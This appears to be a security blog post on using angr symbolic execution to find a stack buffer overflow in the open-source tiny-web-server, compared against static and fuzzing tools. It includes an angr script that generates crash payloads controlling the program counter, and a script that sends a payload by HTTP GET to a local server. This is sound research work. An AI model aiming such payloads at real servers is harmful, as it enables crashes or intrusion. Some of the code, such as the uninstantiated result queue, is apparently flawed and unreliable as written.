---
title: "Automated Stack Smashing with Angr"
layout: "post"
categories: "Linux"
tags: ["Vulnerability Research", "Symbolic Execution", "Reverse Engineering"]
---

Hello everyone, 

I wanted to share my recent experience using Angr to detect stack-based overflows in binaries. Static analyzers like Fortify have proven unreliable in detecting memory corruption because they lack the ability to track taint flow and rely on static control flow analysis, which doesn’t fully capture how a program behaves during execution.

Taint flow analysis tracks how untrusted or potentially dangerous data (like user inputs) propagates through a program’s execution. Without dynamic tracking of this tainted data, static tools like Fortify can’t follow how inputs affect variables, memory, or execution paths at runtime, leaving vulnerabilities such as buffer overflows undetected. While Fortify can analyze the code structure and identify vulnerabilities based on known patterns, it doesn’t dynamically trace how inputs influence the program's behavior during execution.

Similarly, Fortify's control flow analysis is limited to a static control flow graph (CFG), which represents possible execution paths in the code based on the program's structure (branches, loops, function calls). However, this static graph doesn't account for the runtime influence of inputs or edge cases that might trigger vulnerabilities. Without real-time path exploration, Fortify can't fully understand how the program reacts under different input conditions or explore exceptional edge cases that could lead to vulnerabilities.

This is where Angr excels. By using symbolic execution, Angr simulates how the binary behaves with various symbolic inputs, dynamically exploring multiple execution paths. This enables it to track how tainted data influences the program and how control flow changes based on different inputs. Angr builds and analyzes its own dynamic control flow graph, considering both the program’s logic and the impact of symbolic inputs. As a result, Angr is much more effective at uncovering vulnerabilities like stack-based overflows that static analyzers like Fortify may miss.

Given the above context, I wanted to test how Angr performs with black-box binaries. My usual approach to finding memory corruption is by using coverage-guided fuzzing tools like AFL++, or libFuzzer if the source code is available. I typically employ AFL++ in qemu mode for testing black-box binaries. Since the ultimate goal of vulnerability research is to find a remote bug, the binaries we deal with often involve sockets.

AFL++ is primarily designed for file-based fuzzing, so it requires workarounds such as desock and binary patching to interact with binaries that use sockets. Attify's blog provides a great guide on how to set this up, which can be found here, [https://web.archive.org/web/20230819131007/https://blog.attify.com/fuzzing-iot-binaries-with-afl-part-ii/](https://web.archive.org/web/20230819131007/https://blog.attify.com/fuzzing-iot-binaries-with-afl-part-ii/).

Using AFL++ can be challenging on RISC binaries running on embedded systems because it requires emulating the target runtime environment, including all the dependencies the binary relies on. In contrast, Angr uses symbolic execution, allowing it to explore execution paths without needing a real runtime environment. By treating inputs as symbolic variables, Angr can analyze the binary's behavior directly, making it more flexible and easier to use in situations where emulation would be complex or not feasible.


Because Angr is more flexible, I wanted to see how it would do detecting a simple buffer overflow in this Github repository: [https://github.com/shenfeng/tiny-web-server/tree/master](https://github.com/shenfeng/tiny-web-server/tree/master). The code has a buffer overflow at line 255 because the memcpy function writes to the `req->filename buffer`, which is 512 bytes in size, in a loop controlled by `while(*p && --max)`, where `MAXLINE` is 1024, causing an out-of-bounds write. Before I analyze this binary with Angr I want to first see how a few other automated vulnerability discovery techniques do.


The first technique I'll employ is detailed in this article: [https://security.humanativaspa.it/automating-binary-vulnerability-discovery-with-ghidra-and-semgrep/](https://security.humanativaspa.it/automating-binary-vulnerability-discovery-with-ghidra-and-semgrep/). 
The approach in this article involves using semgrep rules to analyze Ghidra's decompilation, but since compilers often inline functions like memcpy, it's not present in the decompiled code. In the case of the url_decode function, this inlining causes the semgrep rules to overlook the vulnerable section of code.


![](/assets/posts/2023-11-12-angr-full-binary/ida_decompilation_tiny.bmp)

![](/assets/posts/2023-11-12-angr-full-binary/ghidra_decompilation_tiny.bmp)

Another technique worth discussing involves utilizing cwe\_checker ([https://github.com/fkie-cad/cwe_checker](https://github.com/fkie-cad/cwe_checker)) to identify the vulnerability. However, upon executing cwe\_checker, it doesn't flag any vulnerability within the url\_decode function.

![](/assets/posts/2023-11-12-angr-full-binary/cwe_checker_tiny.bmp)

I will now use Angr to uncover the overflow within the `url_decode function`. Despite its effectiveness, leveraging Angr for the analysis of extensive binaries has presented challenges, notably due to path explosion. Symbolic execution, a core aspect of Angr, systematically explores all potential execution paths within a program. However, in the case of large binaries characterized by numerous conditional branches, loops, and intricate control flow, the sheer volume of potential paths can multiply rapidly, leading to what's known as path explosion. This significantly slows down the analysis process and often results in freezing my virtual machine.

I highly recommend conducting Angr analyses on a VM or host equipped with ample CPU and memory resources to support the demanding nature of this process.
In light of path explosion, I've often found greater success by directing Angr to a specific function address and starting the analysis from that point onward. This GitBook shows how to do that: [https://breaking-bits.gitbook.io/breaking-bits/vulnerability-discovery/automated-exploit-development/buffer-overflows](https://breaking-bits.gitbook.io/breaking-bits/vulnerability-discovery/automated-exploit-development/buffer-overflows).

My first task was to extract all functions from the binary's code section and construct a dictionary that Angr could reference during analysis. I specifically aimed to exclude any C library calls and functions attributed to the GCC toolchain. My objective was to obtain the start addresses for each instance the function was called, which I would later use in Angr for overflow analysis. To achieve this, I decided to use radare2 for disassembling the binary, leveraging its command-line interface and user-friendly nature. Below, I've included the code used for this stage.

```py
import r2pipe
import argparse

def get_function_xrefs(binary_path):
    r2 = r2pipe.open(binary_path)

    # Analyze the binary
    r2.cmd('aaa')

    # Get a list of functions
    functions = r2.cmdj('aflj')

    function_xrefs = {}

    excluded_functions = ["sym.deregister_tm_clones", "sym.register_tm_clones"]

    for function in functions:
        function_name = function['name']

        if function_name in excluded_functions:
            continue

        # Check if the function is in the .text section and not an import
        if not function_name.startswith('sym.imp.'):
            # Analyze cross-references to the function
            xrefs = r2.cmdj(f'axtj {function_name}')
            if xrefs:
                # Extract the starting address of the call instruction
                call_start_addresses = [xref['from'] for xref in xrefs]

                function_xrefs[function_name] = call_start_addresses

    return function_xrefs

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Print start addresses of calls to functions')
    parser.add_argument('binary_path', type=str, help='Path to the binary')
    args = parser.parse_args()

    function_xrefs = get_function_xrefs(args.binary_path)

    total_xrefs = sum(len(xrefs) for xrefs in function_xrefs.values())

    print(f"Total Cross-references: {total_xrefs}")

    for function, xrefs in function_xrefs.items():
        print(f"Function Name: {function}")
        for xref in xrefs:
            print(f"  Call Start Address: {hex(xref)}")

```

![](/assets/posts/2023-11-12-angr-full-binary/call_start_addresses.bmp)

The script's output highlights 22 cross-references, with just one pointing to url\_decode. The subsequent task involves integrating this script logic into my Angr analysis. Enclosed below is the fully implemented script designed to retrieve all call start addresses and conduct buffer overflow analysis on each. To manage the load and mitigate potential VM freezes, I constrained the concurrent processes to 8. The analysis time per process was also limited to 5 seconds, a deliberate measure to address path explosion challenges. Although extending the analysis time could enhance path exploration, in this context, a shallow path traversal sufficed to pinpoint the overflow.

```py
import angr
import claripy
import sys
import logging
import os
import r2pipe
import argparse
import multiprocessing
import time

# Disable integer to string conversion limit
sys.set_int_max_str_digits(0)

def check_buffer_overflow(simgr, sym, output_folder):
    for path in simgr.unconstrained:
        if path.satisfiable(extra_constraints=[path.regs.pc == 0x4343434343434343]):
            bb_addrs = path.history.bbl_addrs.hardcopy
            potential_overflow_addr = None

            # Find the first occurrence of a basic block address that's different from the current one
            for i in range(1, len(bb_addrs)):
                if bb_addrs[i] != bb_addrs[i - 1]:
                    potential_overflow_addr = bb_addrs[i - 1]
                    break

            if potential_overflow_addr is not None:
                path.add_constraints(path.regs.pc == 0x4343434343434343)
                if path.satisfiable():
                    stdin_payload = path.solver.eval(sym, cast_to=bytes)
                    save_overflow_info(output_folder, potential_overflow_addr, stdin_payload)

    return simgr

def save_overflow_info(output_folder, address, payload):

    output_file = os.path.join(output_folder, f"overflow_{hex(address)}.txt")

    with open(output_file, 'w') as f:
        f.write(f"Address: {hex(address)}\n")
        f.write(f"Payload: {payload.hex() }\n")

def get_function_xrefs(binary_path, excluded_functions):
    r2 = r2pipe.open(binary_path)

    # Analyze the binary
    r2.cmd('aaa')

    # Get a list of functions
    functions = r2.cmdj('aflj')

    function_xrefs = {}

    for function in functions:
        function_name = function['name']

        # Check if the function is in the .text section and not an import
        if not function_name.startswith('sym.imp.') and function_name not in excluded_functions:
            # Analyze cross-references to the function
            xrefs = r2.cmdj(f'axtj {function_name}')
            if xrefs:
                # Extract the starting address of the call instruction
                call_start_addresses = [xref['from'] for xref in xrefs]

                call_start_addresses_hex = [hex(addr) for addr in call_start_addresses]

                function_xrefs[function_name] = call_start_addresses_hex

    return function_xrefs

def analyze_function(binary, call_start_address, payload_size, output_folder, result_queue, timeout):
    project = angr.Project(binary, load_options={'auto_load_libs': False})

    # Set up the initial state with concrete (non-symbolic) stdin
    random_payload = os.urandom(payload_size)
    sym = claripy.BVV(random_payload)
    initial_state = project.factory.entry_state(addr=call_start_address, stdin=sym)

    # Create a new SimulationManager for analysis
    simgr_function = project.factory.simulation_manager(initial_state, save_unconstrained=True)
    
    # Analyze the control flow graph of the binary
    cfg = project.analyses.CFGFast()
    
    start_time = time.time()
    simgr_function.run(until=lambda simgr: time.time() - start_time >= timeout or (len(simgr_function.unconstrained) > 0 and any([path.satisfiable(extra_constraints=[path.regs.pc == call_start_address]) for path in simgr_function.unconstrained])))

    # Check for buffer overflow
    simgr_function = check_buffer_overflow(simgr_function, sym, output_folder)
    
    result_queue.put((call_start_address, simgr_function.unconstrained))

def main(args):

    # Set up Angr project
    project = angr.Project(args.binary, load_options={'auto_load_libs': False})

    excluded_functions = ["sym.deregister_tm_clones", "sym.register_tm_clones"]

    function_xrefs = get_function_xrefs(args.binary, excluded_functions)

    results = []
    result_queue = multiprocessing.Queue

    timeout = 5

    pool = multiprocessing.Pool(processes=8)

    # Iterate over the functions and xrefs and use the pool to parallelize the analysis
    for function, call_start_addresses in function_xrefs.items():
        for addr in call_start_addresses:
            addr_int = int(addr, 16)
            pool.apply_async(analyze_function, (args.binary, addr_int, args.payload_size, args.output_folder, result_queue, timeout))

    pool.close()
    pool.join()

    # Collect the results
    while not result_queue.empty():
        addr, unconstrained = result_queue.get()
        results.append((addr, unconstrained))

    for addr, unconstrained in results:
        for path in unconstrained:
            pass

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Angr script')
    parser.add_argument('binary', type=str, help='Path to the binary to analyze')
    parser.add_argument('--payload-size', type=int, default=4096, help='Size of the payload for analysis')
    parser.add_argument('--output-folder', type=str, default='output', help='Folder to save output files')
    args = parser.parse_args()

    if not os.path.exists(args.output_folder):
        os.makedirs(args.output_folder)

    logging.getLogger("angr").setLevel(logging.CRITICAL)

    main(args)

```

![](/assets/posts/2023-11-12-angr-full-binary/angr_found_overflows.bmp)

Upon running the script, Angr successfully identified multiple potential overflows. Specifically, Angr pinpointed a potential overflow within the url\_decode function, displaying the payload used to trigger it. To execute this overflow, the provided code allows for the payload to be sent as an HTTP GET request, effectively triggering the identified overflow.

```py
import requests
import re

url = "http://127.0.0.1:9999"

with open('output/overflow_0x401e4a.txt', 'r') as file:
    payload = None
    for line in file:
        if line.startswith("Payload: "):
            payload = line[len("Payload: "):].strip()
            break

# Send the payload as a GET request
response = requests.get(f"{url}/{payload}")

if response.status_code == 200:
    print("Request successful")
else:
    print(f"Request failed with status code: {response.status_code}")

```

![](/assets/posts/2023-11-12-angr-full-binary/sent_angr_payload.bmp)


Looking back on the test, it's clear that Angr is highly effective at analyzing whole binaries to uncover simpler bugs. When focused on specific functions, its capabilities really stand out. While payload generation might not be the most relevant in this case, Angr's ability to pinpoint and isolate key sections of code is incredibly useful, allowing researchers to efficiently prioritize their reverse engineering efforts. I appreciate everyone taking the time to read this blog and hopefully find it useful!
